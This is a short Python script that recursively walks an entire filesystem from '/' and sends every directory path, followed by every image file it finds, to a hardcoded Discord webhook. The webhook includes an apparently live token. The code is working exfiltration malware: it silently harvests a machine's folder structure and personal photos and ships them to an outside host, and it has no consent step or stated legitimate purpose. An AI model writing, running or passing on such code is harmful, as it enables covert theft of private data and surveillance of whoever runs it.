import os
import requests

# Your provided Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1268299804178382858/oBr9g7ABpVtlTIJFWlrf1QMjRyn20JyfkQh3gUzoXHPaMMjmizc82a_CR98JENzWL7aD'

# List of image extensions to look for
IMAGE_EXTENSIONS = {'.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff'}

def get_all_directories_and_images(start_path):
    directories = []
    image_files = []
    for root, dirs, files in os.walk(start_path):
        for dir_name in dirs:
            full_path = os.path.join(root, dir_name)
            directories.append(full_path)
        for file_name in files:
            if os.path.splitext(file_name)[1].lower() in IMAGE_EXTENSIONS:
                full_path = os.path.join(root, file_name)
                image_files.append(full_path)
    return directories, image_files

def send_text_to_discord(content):
    payload = {
        'content': content
    }
    response = requests.post(WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        print("Text message successfully sent to Discord.")
    else:
        print(f"Failed to send text message. Status code: {response.status_code}, Response: {response.text}")

def send_image_to_discord(image_path):
    with open(image_path, 'rb') as image_file:
        response = requests.post(
            WEBHOOK_URL,
            files={'file': image_file}
        )
    if response.status_code == 204:
        print(f"Image {image_path} successfully sent to Discord.")
    else:
        print(f"Failed to send image {image_path}. Status code: {response.status_code}, Response: {response.text}")

def main():
    start_path = '/'  # Use '/' for Unix-based systems or 'C:\\' for Windows
    directories, image_files = get_all_directories_and_images(start_path)
    
    # Convert list of directories to a single string with each directory on a new line
    directories_content = '\n'.join(directories)
    
    # Consider breaking into chunks if there are too many directories
    if len(directories_content) > 2000:
        chunks = [directories_content[i:i+2000] for i in range(0, len(directories_content), 2000)]
        for chunk in chunks:
            send_text_to_discord(chunk)
    else:
        send_text_to_discord(directories_content)
    
    # Send images
    for image_path in image_files:
        send_image_to_discord(image_path)

if __name__ == "__main__":
    main()

